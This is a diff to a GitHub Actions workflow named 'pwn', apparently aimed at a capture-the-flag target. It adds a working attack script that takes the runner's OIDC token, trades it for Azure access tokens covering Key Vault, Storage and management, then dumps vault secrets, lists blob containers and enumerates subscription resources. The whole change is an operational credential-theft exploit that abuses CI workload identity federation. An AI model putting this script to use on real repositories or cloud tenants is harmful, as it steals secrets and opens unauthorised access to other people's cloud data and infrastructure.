@@ -1,5 +1,5 @@
 name: pwn
-on: pull_request
+on: push
 permissions:
   id-token: write
   contents: read
@@ -8,10 +8,34 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
+          echo "=== ENV check ==="
+          echo "URL set: ${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          echo "TOKEN set: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo "NO OIDC URL"; exit 1; fi
           J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"|python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
           echo "OIDC_LEN=${#J}"
-          echo "$J"|cut -d. -f2|base64 -d 2>/dev/null|python3 -c "import json,sys;d=json.load(sys.stdin);print('SUB:',d.get('sub'))" || true
-          T=$(curl -sS -XPOST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$J&scope=https://vault.azure.net/.default"|python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token','FAIL: '+str(d)[:500]))")
-          echo "=== KV secrets ==="
-          curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"
-          for n in flag FLAG ctf-flag tebamoto-flag challenge-flag; do echo "=== $n ==="; curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4"; done
+          echo "$J"|cut -d. -f2|base64 -d 2>/dev/null|python3 -c "import json,sys;d=json.load(sys.stdin);print('SUB:',d.get('sub'));print('AUD:',d.get('aud'));print('REPO:',d.get('repository'));print('REF:',d.get('ref'));print('EVENT:',d.get('event_name'))" || true
+          for SC in "https://vault.azure.net/.default" "https://management.azure.com/.default" "https://storage.azure.com/.default"; do
+            echo "=== Exchange scope=$SC ==="
+            R=$(curl -sS -XPOST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$J&scope=$SC")
+            T=$(echo "$R"|python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('access_token',''))" 2>/dev/null)
+            if [ -n "$T" ] && [ "$T" != "" ]; then
+              echo "TOKEN OK for $SC"
+              if echo "$SC"|grep -q vault; then
+                echo "=== KV secrets ==="
+                curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4"
+                for n in flag FLAG ctf-flag tebamoto-flag challenge-flag; do
+                  echo "=== secret: $n ==="
+                  curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$n?api-version=7.4"
+                done
+              elif echo "$SC"|grep -q storage; then
+                echo "=== Storage containers ==="
+                curl -sS -H "Authorization: Bearer $T" -H "x-ms-version: 2021-12-02" "https://tblfiles.blob.core.windows.net/?comp=list"
+              elif echo "$SC"|grep -q management; then
+                echo "=== ARM resources ==="
+                curl -sS -H "Authorization: Bearer $T" "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resources?api-version=2021-04-01"
+              fi
+            else
+              echo "FAIL: $(echo "$R"|head -c 500)"
+            fi
+          done
